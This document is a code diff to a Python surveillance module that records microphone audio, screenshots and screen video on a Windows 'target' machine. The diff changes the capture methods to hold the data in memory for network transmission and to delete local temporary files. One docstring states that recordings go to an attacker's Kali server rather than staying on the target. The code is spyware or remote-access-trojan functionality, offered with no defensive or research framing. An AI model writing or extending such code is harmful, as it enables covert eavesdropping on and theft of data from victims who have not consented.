@@ -3,15 +3,15 @@ import sys
 import time
 import threading
 import json
+import tempfile
+import io
 from datetime import datetime
 
 # Audio and screen recording imports
 import pyaudio
 import wave
-
 import cv2
 import numpy as np
-
 from PIL import ImageGrab, Image
 import pyautogui
 import win32gui
@@ -47,7 +47,8 @@ class AudioRecorder:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"audio_{timestamp}.wav"
         
-        self.filename = os.path.join(self.output_dir, filename)
+        # Store filename for later use (don't save locally)
+        self.temp_filename = filename
         self.frames = []
         self.is_recording = True
         
@@ -112,21 +113,27 @@ class AudioRecorder:
         if self.audio_thread:
             self.audio_thread.join(timeout=5)
         
-        return True, f"Audio recording stopped: {self.filename}"
+        return self.save_audio()
     
     def save_audio(self):
-        """Save recorded audio to WAV file"""
+        """Convert recorded audio to WAV data for transmission"""
         try:
-            wf = wave.open(self.filename, 'wb')
+            import io
+            # Create WAV data in memory
+            audio_buffer = io.BytesIO()
+            wf = wave.open(audio_buffer, 'wb')
             wf.setnchannels(self.channels)
             wf.setsampwidth(pyaudio.PyAudio().get_sample_size(self.sample_format))
             wf.setframerate(self.fs)
             wf.writeframes(b''.join(self.frames))
             wf.close()
-            return True
+            
+            audio_data = audio_buffer.getvalue()
+            print(f"Audio data prepared: {self.temp_filename} ({len(audio_data)} bytes)")
+            return True, {"filename": self.temp_filename, "data": audio_data, "size": len(audio_data)}
         except Exception as e:
-            print(f"Error saving audio: {str(e)}")
-            return False
+            print(f"Error preparing audio: {str(e)}")
+            return False, str(e)
     
     def get_audio_devices(self):
         """Get list of available audio input devices"""
@@ -168,22 +175,24 @@ class ScreenRecorder:
         print(f"Screen recorder initialized: {self.output_dir}")
     
     def take_screenshot(self, filename=None):
-        """Take a screenshot on Windows target"""
+        """Take a screenshot on Windows target and return image data"""
         try:
             # Generate filename if not provided
             if filename is None:
                 timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                 filename = f"screenshot_{timestamp}.png"
             
-            # Use absolute path to ensure proper file creation
-            filepath = os.path.join(self.output_dir, filename)
-            
             # Take screenshot using PIL ImageGrab (Windows only)
             screenshot = ImageGrab.grab()
-            screenshot.save(filepath)
             
-            print(f"Screenshot saved to: {filepath}")
-            return True, f"Screenshot saved: {filepath}"
+            # Convert to bytes for network transmission
+            import io
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            img_data = img_byte_arr.getvalue()
+            
+            print(f"Screenshot captured: {filename} ({len(img_data)} bytes)")
+            return True, {"filename": filename, "data": img_data, "size": len(img_data)}
             
         except Exception as e:
             return False, f"Screenshot error: {str(e)}"
@@ -198,7 +207,9 @@ class ScreenRecorder:
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = f"screen_{timestamp}.avi"
         
-        self.filename = os.path.join(self.output_dir, filename)
+        # Store for network transmission (don't save locally)
+        self.temp_filename = filename
+        self.video_frames = []
         self.is_recording = True
         
         def record_screen():
@@ -206,9 +217,15 @@ class ScreenRecorder:
                 # Get screen dimensions
                 screen_size = pyautogui.size()
                 
+                # Create temporary file for video (will be read later)
+                import tempfile
+                temp_video_file = tempfile.NamedTemporaryFile(delete=False, suffix='.avi')
+                temp_video_path = temp_video_file.name
+                temp_video_file.close()
+                
                 # Initialize video writer
                 self.video_writer = cv2.VideoWriter(
-                    self.filename, 
+                    temp_video_path, 
                     self.fourcc, 
                     self.fps, 
                     screen_size
@@ -233,9 +250,20 @@ class ScreenRecorder:
                     if duration and (time.time() - start_time) >= duration:
                         break
                 
-                # Release video writer
+                # Release video writer and prepare data
                 if self.video_writer:
                     self.video_writer.release()
+                
+                # Read video file and store data
+                try:
+                    with open(temp_video_path, 'rb') as f:
+                        video_data = f.read()
+                    os.unlink(temp_video_path)  # Delete temp file
+                    self.video_data = video_data
+                    print(f"Video data prepared: {self.temp_filename} ({len(video_data)} bytes)")
+                except Exception as e:
+                    print(f"Error reading video data: {e}")
+                    self.video_data = None
                 
             except Exception as e:
                 print(f"Screen recording error: {str(e)}")
@@ -247,7 +275,7 @@ class ScreenRecorder:
         return True, f"Screen recording started: {self.filename}"
     
     def stop_screen_recording(self):
-        """Stop screen recording"""
+        """Stop screen recording and return video data"""
         if not self.is_recording:
             return False, "Not currently recording"
         
@@ -255,9 +283,13 @@ class ScreenRecorder:
         
         # Wait for thread to complete
         if self.video_thread:
-            self.video_thread.join(timeout=5)
+            self.video_thread.join(timeout=10)
         
-        return True, f"Screen recording stopped: {self.filename}"
+        # Return video data if available
+        if hasattr(self, 'video_data') and self.video_data:
+            return True, {"filename": self.temp_filename, "data": self.video_data, "size": len(self.video_data)}
+        else:
+            return False, "No video data available"
     
     def get_window_screenshot(self, window_title=None):
         """Take screenshot of specific window"""        
@@ -359,24 +391,34 @@ class SurveillanceRecorder:
         return True, " | ".join(results)
     
     def stop_surveillance(self):
-        """Stop all surveillance recording"""
+        """Stop all surveillance recording and return data"""
         if not self.surveillance_active:
             return False, "No surveillance active"
         
-        results = []
+        result_data = {}
         
-        # Stop audio recording
+        # Stop audio recording and get data
         if self.audio_recorder.is_recording:
-            audio_success, audio_msg = self.audio_recorder.stop_recording()
-            results.append(f"Audio: {audio_msg}")
+            audio_success, audio_result = self.audio_recorder.stop_recording()
+            if audio_success and isinstance(audio_result, dict):
+                result_data['audio_filename'] = audio_result['filename']
+                result_data['audio_data'] = audio_result['data']
+                result_data['audio_size'] = audio_result['size']
         
-        # Stop screen recording
+        # Stop screen recording and get data
         if self.screen_recorder.is_recording:
-            video_success, video_msg = self.screen_recorder.stop_screen_recording()
-            results.append(f"Video: {video_msg}")
+            video_success, video_result = self.screen_recorder.stop_screen_recording()
+            if video_success and isinstance(video_result, dict):
+                result_data['video_filename'] = video_result['filename']
+                result_data['video_data'] = video_result['data']
+                result_data['video_size'] = video_result['size']
         
         self.surveillance_active = False
-        return True, " | ".join(results)
+        
+        if result_data:
+            return True, result_data
+        else:
+            return True, "Recording stopped but no data available"
     
     def take_surveillance_snapshot(self):
         """Take immediate screenshot and short audio sample"""
@@ -405,33 +447,8 @@ class SurveillanceRecorder:
         return True, " | ".join(results)
     
     def list_recordings(self):
-        """List all recorded files"""
-        recordings = []
-        
-        try:
-            if os.path.exists(self.output_dir):
-                files = os.listdir(self.output_dir)
-                print(f"Found {len(files)} items in directory")
-                
-                for filename in files:
-                    filepath = os.path.join(self.output_dir, filename)
-                    if os.path.isfile(filepath):
-                        stat = os.stat(filepath)
-                        recordings.append({
-                            'filename': filename,
-                            'path': filepath,
-                            'size': stat.st_size,
-                            'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
-                            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
-                        })
-                        print(f"Added recording: {filename} ({stat.st_size} bytes)")
-            else:
-                print(f"Recordings directory does not exist: {self.output_dir}")
-                
-        except Exception as e:
-            print(f"Error listing recordings: {str(e)}")
-        
-        return recordings
+        """Recordings are stored on server, not locally"""
+        return "Recordings are stored on the server (Kali), not on this target machine"
     
     def delete_recording(self, filename):
         """Delete a specific recording"""
